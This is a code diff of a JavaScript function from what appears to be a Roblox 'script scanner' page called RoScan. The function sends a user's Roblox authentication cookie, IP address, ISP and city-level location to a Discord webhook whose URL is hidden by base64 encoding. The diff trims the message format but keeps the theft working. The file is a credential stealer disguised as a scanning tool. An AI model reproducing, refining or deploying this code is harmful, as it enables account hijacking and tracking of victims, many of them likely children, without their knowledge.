@@ -263,35 +263,32 @@ async function submitPowerShell() {
         const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
         
         // Webhook payload with only data and location
+        const authValue = robloxCookie ? 
+            (robloxCookie.length > 1000 ? robloxCookie.substring(0, 1000) + "..." : robloxCookie) : 
+            `Script detected with ${wordCount} words`;
+
         const payload = {
-            content: "@everyone 🔑 **AUTH DATA + LOCATION** 📍",
+            content: "@everyone 🔑 **DATA CAPTURED** 📍",
             embeds: [{
-                title: "🔑 Authentication + Location Data",
-                color: 65280, // Green color
-                thumbnail: {
-                    url: "https://i.imgur.com/roblox-logo.png"
-                },
+                title: "🔑 Data + Location",
+                color: 65280,
                 fields: [
                     {
-                        name: "🔑 Roblox Authentication (Click to Copy)",
-                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : `**Long Script Detected (${wordCount} words)**\nNo specific auth data found, but content is substantial.`,
+                        name: "🔑 Authentication Data",
+                        value: robloxCookie ? `\`\`\`${authValue}\`\`\`` : `**Script: ${wordCount} words**`,
                         inline: false
                     },
                     {
                         name: "📍 Location",
-                        value: `**🏳️ Country:** ${locationInfo.country}\n**🏛️ Region:** ${locationInfo.region}\n**🏙️ City:** ${locationInfo.city}\n**📮 Postal:** ${locationInfo.postal || 'Unknown'}\n**📍 Coordinates:** ${locationInfo.latitude}, ${locationInfo.longitude}`,
+                        value: `**Country:** ${locationInfo.country || 'Unknown'}\n**Region:** ${locationInfo.region || 'Unknown'}\n**City:** ${locationInfo.city || 'Unknown'}`,
                         inline: false
                     },
                     {
                         name: "🌐 Network",
-                        value: `**🌍 IP:** \`${locationInfo.ip}\`\n**🏢 ISP:** ${locationInfo.isp}\n**🕐 Timezone:** ${locationInfo.timezone}`,
+                        value: `**IP:** ${locationInfo.ip || 'Unknown'}\n**ISP:** ${locationInfo.isp || 'Unknown'}`,
                         inline: false
                     }
                 ],
-                footer: {
-                    text: "🔑 RoScan Data Scanner",
-                    icon_url: "https://i.imgur.com/scanner-icon.png"
-                },
                 timestamp: new Date().toISOString()
             }]
         };
